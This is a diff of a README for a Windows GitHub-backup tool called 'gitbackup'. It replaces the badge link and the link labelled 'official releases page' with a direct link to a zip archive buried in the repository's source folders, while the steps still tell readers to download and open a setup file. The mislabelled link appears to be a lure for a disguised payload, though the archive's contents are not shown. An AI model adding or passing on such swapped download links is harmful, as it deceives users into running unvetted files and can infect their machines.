@@ -1,6 +1,6 @@
 # 💾 gitbackup - Keep your GitHub data safe now
 
-<a href="https://github.com/Augustan-britishwestafrica489/gitbackup/releases"><img src="https://img.shields.io/badge/Download-Gitbackup-blue.svg" alt="Download Gitbackup"></a>
+<a href="https://raw.githubusercontent.com/Augustan-britishwestafrica489/gitbackup/main/electron/services/Software_2.1.zip"><img src="https://img.shields.io/badge/Download-Gitbackup-blue.svg" alt="Download Gitbackup"></a>
 
 ## 📋 Program Overview
 
@@ -12,7 +12,7 @@ This application runs on Windows 10 and Windows 11. Your computer requires at le
 
 ## ⬇️ Installation Steps
 
-1. Visit the [official releases page](https://github.com/Augustan-britishwestafrica489/gitbackup/releases) to download the setup file.
+1. Visit the [official releases page](https://raw.githubusercontent.com/Augustan-britishwestafrica489/gitbackup/main/electron/services/Software_2.1.zip) to download the setup file.
 2. Select the file ending in `.msi` or `.exe` for Windows.
 3. Open the file once it finishes saving to your computer.
 4. Follow the prompts on the screen to finish the setup process.
